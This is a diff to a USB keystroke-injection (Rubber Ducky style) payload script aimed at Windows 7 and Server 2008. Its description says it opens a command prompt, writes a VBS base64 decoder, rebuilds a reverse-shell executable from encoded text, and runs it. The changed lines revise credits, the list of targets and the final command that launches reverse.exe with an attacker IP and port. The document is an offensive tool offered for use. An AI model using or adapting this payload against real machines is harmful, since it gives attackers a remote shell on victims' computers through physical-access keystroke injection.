@@ -1,10 +1,10 @@
 REM Author: Darren Kitchen with mad props to IllWill dabermania.blogspot.co.il/2011/04/copying-executable-from-teensy-using.html
 
-REM 27/12/2017: Mod by r00tpgp, removed admin privilege cmd, added auto overwrite on copy con & removed absolute path for source and dest
+REM 27/12/2017: Mod by r00tpgp, removed admin privilege cmd, added auto overwrite on copy con and removed absolute path
 
 REM Duckencoder: 1.0
 
-REM Target: Windows 7
+REM Target: Windows 7(32&64b), Windows 2008 Server
 
 REM Description: Opens administrative CMD prompt, creates decoder.vbs containing code to convert base64 encoded ascii to binary, creates text file including base64 ascii of binary file to create reverse shell. converts second file to exe with first file. Executes with host and port parameters. Props to go illwill for this payload. See dabermania.blogspot.co.il/2011/04/copying-executable-from-teensy-using.html
 
@@ -93,7 +93,7 @@ CTRL z
 ENTER
 STRING cscript decoder.vbs reverse.txt reverse.exe
 ENTER
-STRING reverse.exe <DEST_IP> <PORT>
+STRING reverse.exe <IP> <PORT>
 ENTER
 STRING exit
 ENTER
